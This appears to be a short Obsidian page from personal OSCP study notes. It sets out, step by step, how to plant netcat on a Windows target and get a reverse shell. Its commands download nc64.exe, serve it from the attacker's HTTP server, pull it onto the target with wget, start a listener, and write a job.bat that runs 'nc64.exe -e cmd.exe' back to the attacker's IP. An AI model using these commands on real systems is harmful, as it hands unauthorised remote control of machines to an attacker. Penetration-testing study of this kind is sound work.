https://github.com/int0x33/nc.exe/

[[System Architecture]]

nc.exe > 32 bit
nc64.exe > 64 bit

nc.exe
```
wget https://github.com/int0x33/nc.exe/blob/master/nc.exe
```

nc64.exe
```
wget https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe
```

Start a python server on attacker
```
python3 -m http.server 8000
```

Transfer nc64.exe onto target machine
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `wget http://${KaliIP}:[port_no]/nc64.exe -outfile nc64.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
Start a netcat listener to catch the reverse connection
```
nc -lvnp 4444
```

Attach the command to the tricked program to execute nc64.exe
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `echo C:\\FILE_LOCATION\\nc64.exe -e cmd.exe ${KaliIP} {LISTENER_PORT} > C:\\FILE_LOCATION\\job.bat`;

dv.paragraph("```bash\n" + command + "\n```");
```


